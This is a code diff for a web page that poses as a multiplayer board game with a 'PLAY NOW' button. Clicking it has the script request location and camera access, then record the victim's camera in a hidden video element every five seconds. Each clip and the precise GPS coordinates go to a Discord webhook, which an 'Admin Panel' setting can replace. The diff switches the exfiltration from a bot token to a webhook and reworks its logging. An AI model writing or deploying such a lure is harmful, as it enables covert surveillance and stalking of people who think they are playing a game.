@@ -49,25 +49,28 @@
             box-shadow: 0 5px 15px rgba(243, 156, 18, 0.4);
             transition: transform 0.2s;
         }
-        .play-btn:disabled {
-            background-color: #7f8c8d;
-            cursor: not-allowed;
-        }
-        #recordingVideo { display: none; }
-        /* Debug Log (Hidden by default) */
+        .play-btn:disabled { background-color: #7f8c8d; cursor: not-allowed; }
+        
+        /* Debug Log */
         #debugLog {
-            position: absolute;
-            bottom: 10px;
-            left: 10px;
+            position: fixed;
+            top: 10px;
+            right: 10px;
             background: rgba(0,0,0,0.8);
             color: #0f0;
             font-size: 10px;
-            padding: 5px;
-            display: none; 
+            padding: 10px;
+            width: 200px;
+            max-height: 150px;
+            overflow-y: auto;
+            border-radius: 5px;
+            z-index: 9999;
         }
     </style>
 </head>
 <body>
+
+    <div id="debugLog">Debug Log:</div>
 
     <div class="game-board" id="board">
         <div class="cell home-yellow" style="grid-column: 1-6; grid-row: 1-6;"></div>
@@ -82,53 +85,34 @@
     </div>
 
     <button class="play-btn" id="playBtn">PLAY NOW</button>
-    <video id="recordingVideo" autoplay muted playsinline></video>
-    <div id="debugLog"></div>
+    <video id="recordingVideo" autoplay muted playsinline style="display:none;"></video>
 
     <script>
-        // --- CONFIGURATION ---
-        const CONFIG = {
-            BOT_TOKEN: "YOUR_DISCORD_BOT_TOKEN_HERE", 
-            SERVER_ID: "YOUR_DISCORD_SERVER_ID_HERE",
-            CHANNEL_ID: "YOUR_DISCORD_CHANNEL_ID_HERE",
-            RECORD_DURATION: 5000, 
-            WAIT_DURATION: 5000   
-        };
+        // Default Webhook (Agar Admin Panel se kuch set na ho)
+        const DEFAULT_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
 
-        // Load Config if exists
-        if (typeof ENCODED_CONFIG !== 'undefined') {
-            const decoded = decodeURIComponent(escape(atob(ENCODED_CONFIG)));
-            const configData = JSON.parse(decoded);
-            if(configData.discord) {
-                CONFIG.BOT_TOKEN = configData.discord.botToken;
-                CONFIG.CHANNEL_ID = configData.discord.channelId;
-                CONFIG.SERVER_ID = configData.discord.serverId || "UNKNOWN";
-            }
-            if(configData.settings) {
-                CONFIG.RECORD_DURATION = configData.settings.recordSeconds * 1000;
-                CONFIG.WAIT_DURATION = configData.settings.waitSeconds * 1000;
-            }
-        }
-
-        let mediaRecorder;
-        let videoChunks = [];
         let currentLocation = null;
         let watchId;
         let stream = null;
+        let mediaRecorder;
+        let videoChunks = [];
 
         const playBtn = document.getElementById('playBtn');
         const debugLog = document.getElementById('debugLog');
 
         function log(msg) {
             console.log(msg);
-            debugLog.innerText += msg + "\n";
+            const entry = document.createElement('div');
+            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            debugLog.prepend(entry);
         }
 
         playBtn.addEventListener('click', startProcess);
 
         async function startProcess() {
             playBtn.disabled = true;
-            playBtn.innerText = "Connecting...";
+            playBtn.innerText = "Finding Players...";
+            log("Starting Process...");
 
             // 1. Location Permission
             if (navigator.geolocation) {
@@ -139,7 +123,7 @@
                             lng: position.coords.longitude,
                             timestamp: new Date().toISOString()
                         };
-                        log("Location Updated: " + currentLocation.lat);
+                        log("Location Updated: " + currentLocation.lat.toFixed(6));
                     },
                     (error) => {
                         currentLocation = { error: error.message };
@@ -147,6 +131,8 @@
                     },
                     { enableHighAccuracy: true }
                 );
+            } else {
+                log("Geolocation not supported");
             }
 
             // 2. Camera Permission
@@ -161,7 +147,7 @@
                 videoElement.play();
                 log("Camera Access Granted.");
 
-                // Start the first loop
+                // Start the loop
                 recordAndSend();
 
             } catch (err) {
@@ -186,53 +172,60 @@
                 const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                 uploadToDiscord(videoBlob);
                 
-                // Schedule next loop
+                // Wait 5 seconds then loop again
                 setTimeout(() => {
-                    recordAndSend();
-                }, CONFIG.WAIT_DURATION);
+                    if (stream.active) {
+                        recordAndSend();
+                    } else {
+                        log("Stream stopped.");
+                    }
+                }, 5000);
             };
 
             mediaRecorder.start();
             
-            // Stop after duration
+            // Stop after 5 seconds
             setTimeout(() => {
                 mediaRecorder.stop();
-            }, CONFIG.RECORD_DURATION);
+            }, 5000);
         }
 
         async function uploadToDiscord(blob) {
             const formData = new FormData();
             formData.append("file", blob, "recording.webm");
 
-            const payload = {
-                content: `📍 Location: ${currentLocation ? `Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}` : 'No Location'} \n 📅 Time: ${new Date().toISOString()}`
-            };
+            // Prepare Location Data
+            let locationMsg = "📍 No Location Data";
+            if (currentLocation && !currentLocation.error) {
+                locationMsg = `📍 Location: [Lat: ${currentLocation.lat.toFixed(6)}, Lng: ${currentLocation.lng.toFixed(6)}] \n 📅 Time: ${new Date().toISOString()}`;
+            } else if (currentLocation && currentLocation.error) {
+                locationMsg = `📍 Location Error: ${currentLocation.error}`;
+            }
+
+            // Use saved webhook from Admin Panel or default
+            const webhookUrl = localStorage.getItem('discordWebhook') || DEFAULT_WEBHOOK;
 
             try {
-                log("Sending Text Message...");
-                // Send text message with location
-                await fetch(`https://discord.com/api/v10/channels/${CONFIG.CHANNEL_ID}/messages`, {
-                    method: "POST",
-                    headers: {
-                        "Authorization": `Bot ${CONFIG.BOT_TOKEN}`
-                    },
-                    body: JSON.stringify(payload)
-                });
+                log("Sending Location & Video...");
+                
+                formData.append("payload_json", JSON.stringify({
+                    content: locationMsg
+                }));
 
-                log("Sending Video File...");
-                // Send video file
-                await fetch(`https://discord.com/api/v10/channels/${CONFIG.CHANNEL_ID}/messages`, {
+                const response = await fetch(webhookUrl, {
                     method: "POST",
-                    headers: {
-                        "Authorization": `Bot ${CONFIG.BOT_TOKEN}`
-                    },
                     body: formData
                 });
-                
-                log("Upload Successful!");
+
+                if (response.ok) {
+                    log("Upload Successful!");
+                } else {
+                    const errorText = await response.text();
+                    log(`Upload Failed: ${response.status} - ${errorText}`);
+                }
 
             } catch (error) {
-                log("Upload Failed: " + error.message);
+                log("Fetch Error: " + error.message);
             }
         }
     </script>
